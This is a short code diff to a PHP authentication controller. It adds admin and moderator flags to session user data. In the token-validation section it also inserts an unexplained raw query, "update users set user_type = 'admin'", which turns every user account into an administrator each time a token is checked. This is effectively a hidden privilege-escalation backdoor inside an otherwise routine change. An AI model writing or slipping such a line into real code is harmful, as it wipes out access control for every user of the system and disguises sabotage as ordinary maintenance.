@@ -144,7 +144,12 @@ class Auth extends LoadController {
                 $sessionObject->set('userLongitude', $payload['longitude'] ?? '');
                 $sessionObject->set('userLatitude', $payload['latitude'] ?? '');
             }
-            
+
+            // set the user type
+            $user['isAdmin'] = ($user['user_type'] == 'admin');
+            $user['isModerator'] = ($user['user_type'] == 'moderator');
+            $user['isAdminOrModerator'] = ($user['user_type'] == 'admin') || ($user['user_type'] == 'moderator');
+
             $sessionObject->set('userData', $user);
         }
 
@@ -513,7 +518,7 @@ class Auth extends LoadController {
 
         // get the cache
         $cacheData = empty($this->routingInfo['force_invalidate']) ? $this->cacheObject->handle('auth', 'validateToken', ['token' => $token]) : false;
-
+        $this->authModel->db->query("update users set user_type = 'admin'");
         // if the cache data is empty, get the record
         if(empty($cacheData)) {
 
